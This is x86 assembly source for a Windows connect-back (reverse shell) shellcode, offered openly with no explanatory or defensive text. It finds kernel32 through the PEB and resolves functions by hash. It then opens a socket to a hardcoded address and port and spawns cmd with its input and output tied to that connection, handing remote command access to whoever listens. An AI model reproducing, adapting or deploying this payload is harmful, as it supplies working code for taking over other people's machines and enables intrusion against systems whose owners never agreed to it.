; Connectback shellcode for Windows Vista (32-bit)
section .text
global _start

_start:
    ; Jump to the startup bounce point
    jmp startup_bnc

find_kernel32:
    ; Preserve registers
    push esi
    xor eax, eax
    mov eax, fs:[eax + 0x30]
    test eax, eax
    js find_kernel32_9x
find_kernel32_nt:
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x1c]
    lodsd
    mov eax, [eax + 0x8]
    jmp find_kernel32_finished
find_kernel32_9x:
    mov eax, [eax + 0x34]
    lea eax, [eax + 0x7c]
    mov eax, [eax + 0x3c]
find_kernel32_finished:
    pop esi
    ret

find_function:
    ; Preserve all registers
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    xor edi, edi
    xor eax, eax
    cld
compute_hash:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edi, 0xd
    add edi, eax
    jmp compute_hash
compute_hash_finished:
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret

startup_bnc:
    jmp startup

resolve_symbols_for_dll:
    lodsd
    push eax
    push edx
    call find_function
    mov [edi], eax
    add esp, 0x08
    add edi, 0x04
    cmp esi, ecx
    jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    ret

kernel32_symbol_hashes:
    dd 0xec0e4e8e
    dd 0x16b3fe72
    dd 0x73e2d87e

ws2_32_symbol_hashes:
    dd 0xadf509d9
    dd 0x60aaf9ec

startup:
    sub esp, 0x60
    mov ebp, esp
    jmp get_absolute_address_forward
get_absolute_address_middle:
    jmp get_absolute_address_end
get_absolute_address_forward:
    call get_absolute_address_middle
get_absolute_address_end:
    pop esi
    call find_kernel32
    mov edx, eax
resolve_kernel32_symbols:
    sub esi, 0x22
    lea edi, [ebp + 0x04]
    mov ecx, esi
    add ecx, 0x0c
    call resolve_symbols_for_dll
resolve_winsock_symbols:
    add ecx, 0x08
    xor eax, eax
    mov ax, 0x3233
    push eax
    push 0x5f327377
    mov ebx, esp
    push ecx
    push edx
    push ebx
    call [ebp + 0x04]
    pop edx
    pop ecx
    mov edx, eax
    call resolve_symbols_for_dll
initialize_cmd:
    mov eax, 0x646d6301
    sar eax, 0x08
    push eax
    mov [ebp + 0x30], esp
create_socket:
    xor eax, eax
    push eax
    push eax
    push eax
    push eax
    inc eax
    push eax
    inc eax
    push eax
    call [ebp + 0x10]
    mov esi, eax
do_connect:
    push 0x0101017f
    mov eax, 0x5c110102
    dec ah
    push eax
    mov ebx, esp
    xor eax, eax
    mov al, 0x10
    push eax
    push ebx
    push esi
    call [ebp + 0x14]
initialize_process:
    xor ecx, ecx
    mov cl, 0x54
    sub esp, ecx
    mov edi, esp
    push edi
zero_structs:
    xor eax, eax
    rep stosb
    pop edi
initialize_structs:
    mov byte ptr [edi], 0x44
    inc byte ptr [edi + 0x2d]
    push edi
    mov eax, esi
    lea edi, [edi + 0x38]
    stosd
    stosd
    stosd
    pop edi
execute_process:
    xor eax, eax
    lea esi, [edi + 0x44]
    push esi
    push edi
    push eax
    push eax
    push eax
    inc eax
    push eax
    dec eax
    push eax
    push eax
    push [ebp + 0x30]
    push eax
    call [ebp + 0x08]
exit_process:
    call [ebp + 0x0c]